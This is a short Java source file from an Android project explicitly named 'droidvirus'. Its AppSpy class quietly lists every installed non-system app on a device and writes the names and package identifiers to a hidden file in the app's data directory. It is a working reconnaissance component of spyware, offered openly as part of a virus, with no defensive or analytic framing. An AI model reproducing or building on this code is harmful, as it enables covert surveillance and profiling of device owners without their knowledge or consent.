package com.artisanter.droidvirus;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import java.io.IOException;
import java.io.PrintWriter;
import java.util.List;

public class AppSpy {
    static void writeApps(Context context) {
        String appsFile = context.getApplicationInfo().dataDir + "/apps";

        final PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        try {
            PrintWriter pw = new PrintWriter(appsFile);

            for (ApplicationInfo packageInfo : packages) {
                if (!isSystemPackage(packageInfo))
                    pw.println(pm.getApplicationLabel(packageInfo) + ": " + packageInfo.packageName);
            }

            pw.close();
        } catch (IOException ignored) {}
    }

    private static boolean isSystemPackage(ApplicationInfo applicationInfo) {
        return ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
    }
}
